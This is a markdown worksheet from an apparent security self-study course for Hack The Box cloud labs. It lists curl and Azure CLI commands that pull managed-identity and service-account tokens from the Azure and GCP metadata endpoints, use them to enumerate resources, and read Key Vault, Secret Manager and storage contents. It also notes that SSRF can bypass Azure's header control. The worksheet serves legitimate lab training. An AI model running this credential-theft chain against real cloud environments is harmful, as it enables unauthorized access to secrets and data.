---
title: "HTB Cloud Series Day 4 — Azure and GCP Attack Patterns"
tags: [HTB, HackTheBox, CTF, cloud, Azure, GCP, managed-identity, service-account,
       practice, bug-bounty]
module: 05-BugBountyOps-02
day: 309
related_topics:
  - HTB Cloud Series Day 3 (Day 308)
  - Cloud Exploitation (R-09)
  - HTB Cloud Series Day 2 (Day 307)
---

# Day 309 — HTB Cloud Series Day 4: Azure and GCP Attack Patterns

---

## Goals

Apply cloud exploitation techniques against Azure and GCP lab targets.
Understand how managed identities (Azure) and service accounts (GCP) differ
from AWS IAM roles — and how attackers abuse them the same way.

**Time budget:** 4–5 hours.

---

## Part 1 — Azure Managed Identity Abuse

### Azure Metadata Endpoint

```bash
# Azure IMDS — requires Metadata: true header
# No token pre-authentication like IMDSv2 — header is the control
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  | python3 -m json.tool

# Request managed identity access token for Azure Resource Manager
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token\
?api-version=2018-02-01&resource=https://management.azure.com/"
```

```
Metadata accessible: Y/N
Identity type: SystemAssigned / UserAssigned
ClientId: ___
Token obtained: ___
Token expiry: ___
```

### Azure Resource Enumeration with Stolen Token

```bash
# List subscriptions
curl -H "Authorization: Bearer TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# List resource groups in subscription
curl -H "Authorization: Bearer TOKEN" \
  "https://management.azure.com/subscriptions/SUB_ID/resourceGroups\
?api-version=2021-04-01"

# List Key Vault secrets (if identity has access)
curl -H "Authorization: Bearer TOKEN_FOR_VAULT" \
  "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3"
# Note: Key Vault requires a separate token with resource=https://vault.azure.net

# Azure CLI equivalent (after az login with service principal or device code)
az account list
az keyvault list
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
```

```
Resources found:
  - ___

Key Vault secrets: ___
Flag location: ___
```

---

## Part 2 — GCP Service Account Abuse

### GCP Metadata Endpoint

```bash
# GCP IMDS — requires Metadata-Flavor: Google header
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/"

# List service accounts on the instance
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# Get access token for default service account
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get scopes the service account has
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

```
Service accounts found: ___
Token obtained: ___
Scopes: ___
```

### GCP Resource Enumeration with Stolen Token

```bash
# List projects
curl -H "Authorization: Bearer TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# List GCS buckets
curl -H "Authorization: Bearer TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID"

# Access GCS bucket objects
curl -H "Authorization: Bearer TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/BUCKET/o"

# Download object
curl -H "Authorization: Bearer TOKEN" \
  "https://storage.googleapis.com/download/storage/v1/b/BUCKET/o/OBJECT?alt=media"

# List secrets in Secret Manager
curl -H "Authorization: Bearer TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets"

# Access a secret version
curl -H "Authorization: Bearer TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/\
secrets/SECRET_NAME/versions/latest:access"
```

```
GCS buckets: ___
Secret Manager secrets: ___
Flag: ___
```

---

## Part 3 — Cross-Cloud Comparison

```
AWS:
  Metadata:     http://169.254.169.254/latest/meta-data/
  Credential:   iam/security-credentials/ROLE_NAME
  Auth control: IMDSv2 (PUT token required)
  Lateral move: aws cli with AccessKeyId + SecretAccessKey + SessionToken

Azure:
  Metadata:     http://169.254.169.254/metadata/
  Credential:   identity/oauth2/token (Bearer token, not key pair)
  Auth control: Metadata: true header required (easy to bypass via SSRF)
  Lateral move: Azure REST API or az cli with Bearer token

GCP:
  Metadata:     http://metadata.google.internal/computeMetadata/v1/
  Credential:   service-accounts/default/token (Bearer token)
  Auth control: Metadata-Flavor: Google header required
  Lateral move: Google API calls with Bearer token
```

---

## Engagement Summary

```
Cloud targets attacked today: ___
Techniques that worked: ___
Techniques blocked: ___
New tool/command learned: ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q309.1, Q309.2 …).

---

## Navigation

← Previous: [Day 308 — HTB Cloud Series Day 3](DAY-0308-HTB-Cloud-Series-Day-03.md)
→ Next: [Day 310 — HTB Cloud Series Day 5](DAY-0310-HTB-Cloud-Series-Day-05.md)
